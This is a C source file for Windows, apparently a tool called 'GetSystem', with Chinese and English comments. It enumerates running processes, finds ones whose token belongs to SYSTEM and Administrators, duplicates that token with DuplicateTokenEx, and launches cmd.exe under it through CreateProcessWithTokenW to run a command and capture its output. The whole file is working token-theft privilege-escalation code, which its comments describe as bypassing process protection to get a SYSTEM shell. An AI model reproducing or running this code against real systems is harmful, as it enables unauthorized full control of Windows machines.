#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <UserEnv.h>
#include <tchar.h>

#define MAX_ARRAY 35
#define NAME_ARRAY 200

int protected_check(DWORD pid, LPWSTR cmd);
BOOL system_check(PROCESSENTRY32 process);
void token_elevation(HANDLE process, LPWSTR cmd);

typedef struct _process {
	PROCESSENTRY32 pprocess;
	struct process* next;
} process;

typedef struct _protected_process {
	PROCESSENTRY32 pprotected;
} protected_process;

int system_check_flag = 0;

int main(int argc, char** argv) {
	/*
	if (argc <= 1) {
		printf("USAGE: GetSystem.exe Command");
		return -1;
	}
	*/
	char names[20] = "/c ";
	char* command = "whoami";//argv[1];
	strcat(names, command);
	WCHAR wszClassName[256];
	memset(wszClassName, 0, sizeof(wszClassName));
	MultiByteToWideChar(CP_ACP, 0, names, strlen(names) + 1, wszClassName,sizeof(wszClassName) / sizeof(wszClassName[0]));
	LPWSTR cmd = (LPWSTR)wszClassName;	//char* convert to lpwstr
	process* head, *position = NULL;
	printf("%ws\n", cmd);
	PROCESSENTRY32 each_process;
	HANDLE snapshot_proc;
	BOOL first_result, system_process;
	protected_process protected_arr[MAX_ARRAY];
	int protected_count = 0;

	//Uncomment to enable token privileges
	/*BOOL debug_result = EnablePriv();
	if (!debug_result) {
		printf("[!] Error: Failed to acquire Privileges!\n\n");
	}
	else
		printf("[+] SeRestore Privilege Acquired!\n\n");*/

	snapshot_proc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);		//获取进程快照
	if (snapshot_proc == INVALID_HANDLE_VALUE) {
		printf("[!] Error: Could not return handle on snapshot");
		exit(1);
	}

	each_process.dwSize = sizeof(PROCESSENTRY32);
	first_result = Process32First(snapshot_proc, &each_process);
	if (!first_result) {
		printf("[!] Error: Could not grab first process");
		exit(1);
	}

	//Linked list used for future examples on access to different processes for different actions
	//Create first node in linked list
	process* new_entry = (process*)malloc(sizeof(process));
	if (new_entry == NULL) {
		printf("[!] Could not assign new entry on heap!");
		exit(1);
	}

	//The first entry in the linked list is mapped by the head pointer
	new_entry->pprocess = each_process;
	new_entry->next = NULL;
	head = new_entry;

	system_process = system_check(each_process);
	if (system_process) {
		int protection_result = protected_check(each_process.th32ProcessID, cmd);
		if (protection_result) {
			protected_arr[protected_count].pprotected = each_process; //将受保护的进程添加到阵列以供未来使用
			protected_count += 1;
		}
	}

	while (Process32Next(snapshot_proc, &each_process)) {
		position = head;
		while (position->next != NULL)
			position = (process*)position->next;
		process* next_entry = (process*)malloc(sizeof(process));
		if (new_entry == NULL) {
			printf("[!] Could not assign new entry on heap!");
			exit(1);
		}
		next_entry->pprocess = each_process;
		next_entry->next = NULL;
		(process*)position->next = next_entry;

		//after finding the System process once we ignore the system_check function going forward
		if (!system_check_flag) {
			system_process = system_check(each_process);
			if (!system_process)
				continue;
		}

		int protection_result = protected_check(each_process.th32ProcessID, cmd);
		if (protection_result) {
			if (protected_count != MAX_ARRAY) {
				protected_arr[protected_count].pprotected = each_process;
				protected_count += 1;
			}
		}

	}
	printf("全部检索完毕\n");
	CloseHandle(snapshot_proc);
}

//绕过进程的Protected机制
int protected_check(DWORD pid, LPWSTR cmd) {
	printf("opening pid:%d\n", pid);
	HANDLE proc_handle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (proc_handle == NULL) {
		HANDLE proc_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid); //required for protected processes
		token_elevation(proc_handle,cmd);
		return 1;
	}
	token_elevation(proc_handle,cmd);
	return 0;
}

//此函数用于跳过试图窃取其令牌的“系统”进程执行失败并延迟的代码。一旦此函数返回FALSE，则表示已找到系统进程，不再需要此函数
BOOL system_check(PROCESSENTRY32 process) {
	CHAR *system_process = "System";
	int comparison = 0;

	for (int i = 0; i < MAX_PATH; i++) {
		if (process.szExeFile[i] == '\0')		//szExeFile进程全名
			break;
		else if (process.szExeFile[i] == *system_process) {
			system_process++;
			comparison++;
		}
		else
			break;
	}
	if (wcslen(process.szExeFile) == comparison) {
		system_check_flag++;
		return FALSE;
	}
	return TRUE;
}

//This function's objective is to get the user of a process and check if
//it is SYSTEM
BOOL GetUserInfo(HANDLE token, PTCHAR account_name, PTCHAR domain_name) {
	DWORD token_size, name_size = NAME_ARRAY, domain_size = NAME_ARRAY;
	PTOKEN_USER token_user;
	SID_NAME_USE sid_type;
	int comparison = 0;
	PTCHAR arr_cmp = L"SYSTEM";

	GetTokenInformation(token, TokenUser, NULL, 0, &token_size);
	token_user = (PTOKEN_USER)malloc(token_size);
	BOOL result = GetTokenInformation(token, TokenUser, token_user, token_size, &token_size);
	if (!result) {
		printf("[!] Error: Could not obtain user token information!\n");
		return 1;
	}
	else {
		result = LookupAccountSid(NULL, token_user->User.Sid, account_name, &name_size, domain_name, &domain_size, &sid_type);
		if (!result) {
			printf("[!] Error: Could not get user details!\n");
		}
	}
	free(token_user);

	int arr_length = wcslen(account_name);

	for (int z = 0; z < NAME_ARRAY; z++) {
		if (*account_name == '\0')
			break;
		else if (*account_name == *arr_cmp) {
			comparison++;
			account_name++;
			arr_cmp++;
		}
		else
			break;
	}
	if (comparison == arr_length)
		return TRUE;
	else
		return FALSE;
}

//this function's objective is to get the owner of the process and check if
//it is part of the Administrators group
BOOL GetOwnerInfo(HANDLE token, PTCHAR account_name, PTCHAR domain_name) {
	DWORD token_size, name_size = NAME_ARRAY, domain_size = NAME_ARRAY;
	PTOKEN_OWNER token_owner;
	SID_NAME_USE sid_type;
	int comparison = 0;
	PTCHAR arr_cmp = L"Administrators";
	SecureZeroMemory(account_name, NAME_ARRAY);
	SecureZeroMemory(domain_name, NAME_ARRAY);

	GetTokenInformation(token, TokenOwner, NULL, 0, &token_size);
	token_owner = (PTOKEN_OWNER)malloc(token_size);
	BOOL result = GetTokenInformation(token, TokenOwner, token_owner, token_size, &token_size);
	if (!result) {
		printf("[!] Error: Could not obtain owner token information!\n");
	}
	else {
		result = LookupAccountSid(NULL, token_owner->Owner, account_name, &name_size, domain_name, &domain_size, &sid_type);
		if (!result) {
			printf("[!] Error: Could not get user details!\n");
		}
	}
	free(token_owner);

	int arr_length = wcslen(account_name);

	for (int z = 0; z < NAME_ARRAY; z++) {
		if (*account_name == '\0')
			break;
		else if (*account_name == *arr_cmp) {
			comparison++;
			account_name++;
			arr_cmp++;
		}
		else
			break;
	}
	if (comparison == arr_length)
		return TRUE;
	else
		return FALSE;
}

//This function will attempt to duplicate a SYSTEM token and create 
//a new process with it. If successful SYSTEM shell obtained
void token_elevation(HANDLE process, LPWSTR cmd) {
	TCHAR account_name[NAME_ARRAY], domain_name[NAME_ARRAY];
	HANDLE ptoken, new_token, hReadPipe, hWritePipe;
	STARTUPINFO StartupInfo = { 0 };
	PROCESS_INFORMATION procinfo = { 0 };
	BOOL user_check, owner_check, duplicated;
	SECURITY_ATTRIBUTES PipeAttributes = { 0 };

	PipeAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);	//父进程创建子进程，必须让父进程的句柄可继承，可以用SECURITY_ATTRIBUTES来设置
	PipeAttributes.bInheritHandle = TRUE;
	PipeAttributes.lpSecurityDescriptor = FALSE;
	StartupInfo.cb = sizeof(STARTUPINFO);

	BOOL bRet = CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0x400u);	//创建匿名管道

	StartupInfo.hStdError = hWritePipe;
	StartupInfo.hStdOutput = hWritePipe;
	StartupInfo.lpDesktop = L"WinSta0\\Default";
	StartupInfo.dwFlags = 257;
	StartupInfo.wShowWindow = 0;

	BOOL result = OpenProcessToken(process, MAXIMUM_ALLOWED, &ptoken); //
	if (!result) {
		//printf("[!] Error: Could not open handle to token\n");
		return;
	}

	user_check = GetUserInfo(ptoken, account_name, domain_name);
	owner_check = GetOwnerInfo(ptoken, account_name, domain_name);

	if (user_check & owner_check) {
		result = DuplicateTokenEx(ptoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &new_token);
		if (result) {
			SetStdHandle(STD_OUTPUT_HANDLE, hWritePipe);// 设置标准输出到匿名管道
			printf("[+] Token Duplicated\n");
			duplicated = CreateProcessWithTokenW(new_token, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", cmd, CREATE_NO_WINDOW, NULL, NULL, &StartupInfo, &procinfo);//当设置为CREATE_NO_WINDOW时，其值才为0x8000000
			if (duplicated) {
				//WaitForSingleObject(procinfo.hProcess, INFINITE);
				CloseHandle(procinfo.hThread);
				CloseHandle(procinfo.hProcess);
				CloseHandle(hWritePipe);
				printf("[+] SUCCESS\n");
				char szOutputBuffer[4096];
				DWORD dwBytesRead;
				while (TRUE) {
					memset(szOutputBuffer, 0x00, sizeof(szOutputBuffer));
					if (ReadFile(hReadPipe, szOutputBuffer, 4095, &dwBytesRead, NULL) == FALSE)
						break;

					printf("result :%s\n", szOutputBuffer);
				}
				CloseHandle(&StartupInfo);
				CloseHandle(&procinfo);
				exit(1);
			}
			else
			{
				printf("[!] FAIL\n");
			}
		}
	}
}